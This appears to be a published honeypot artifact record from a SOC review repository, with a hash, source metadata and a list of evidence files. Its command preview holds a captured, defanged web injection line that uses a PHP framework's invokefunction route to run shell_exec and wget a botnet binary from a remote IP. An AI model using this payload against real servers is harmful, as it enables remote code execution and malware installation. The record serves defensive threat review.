# c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget hxxp://176[.]65[.]149[.]XXX/bins/kaizen.x8
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
